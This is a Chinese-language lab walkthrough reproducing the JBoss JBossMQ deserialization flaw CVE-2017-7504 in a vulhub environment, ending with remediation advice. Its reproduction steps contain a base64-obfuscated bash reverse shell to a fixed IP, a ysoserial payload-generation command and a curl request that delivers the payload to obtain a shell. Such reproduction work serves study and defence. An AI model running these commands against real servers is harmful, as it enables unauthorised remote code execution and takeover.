# JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）

### 0x00 简介

Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

### 0x01 环境搭建

使用vulhub搭建环境`jboss/CVE-2017-7504`

![image-20230412153049744](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412153049744.png)

访问`http://your-ip:8080/`即可看到JBoss默认页面。

### 0x02 复现步骤

1、访问地址，出现下面页面说明漏洞存在

```
http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet
```

![image-20230412165139342](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412165139342.png)

2、反弹shell命令

```shell
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyLjE1Mi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}
```

3、借助ysoserial的eCommonsCollections5利用链来生成序列化数据

```
java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyLjE1Mi81NTU1IDA+JjE=}|{base64,-d}|{bash,-i}" > poc.ser
```

4、将生成的序列化数据发送至/jbossmq-httpil/HTTPServerILServlet，获取shell

```
curl http://192.168.12.130:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @poc.ser
```

![image-20230412165630277](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412165630277.png)

### 0x03 修复建议

1、因为这类的反序列化都依赖于InvokerTransformer类。如果用户在正常业务中不使用此类，可以将此类移除。方法为使用Winzip打开jar文件，在org/apache/commons/collections/functors/InvokerTransformer.class删除该文件。

2、或者升级JBoss到最新版本。

